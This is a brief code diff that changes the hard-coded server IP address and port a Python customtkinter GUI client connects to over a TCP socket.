@@ -12,8 +12,8 @@ try:
 except:
     pass
 from threading import Thread
-ip = "3.132.159.158"
-port = 16900
+ip = "3.131.147.49"
+port = 10421
 server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 server.connect((ip,port))
 root = customtkinter.CTk()
